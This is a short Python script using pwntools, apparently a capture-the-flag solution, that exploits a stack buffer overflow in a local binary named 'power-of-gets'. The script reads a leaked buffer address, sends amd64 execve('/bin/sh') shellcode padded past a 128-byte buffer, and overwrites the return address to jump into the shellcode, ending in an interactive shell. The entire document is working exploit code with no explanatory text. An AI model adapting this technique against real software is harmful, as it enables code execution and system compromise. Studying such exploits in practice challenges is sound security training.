from pwn import *

ASSEMBLY = shellcraft.amd64.linux.execve("/bin/sh")

p = process("./power-of-gets")

# skip all output up to the address leak
r = p.recvuntil(b"Address of array is ")

r = p.recvuntil(b"\n").decode("utf-8").strip()
addr = int(r, 16)

payload = b""

shellcode = asm(ASSEMBLY, arch="amd64", bits=64)

payload += shellcode
payload += b"A"*(128 - len(shellcode))
payload += b"ABCDABCD"
payload += pack(addr, word_size=64)

p.recv()
p.send(payload)
p.send(b"\n")

p.interactive()
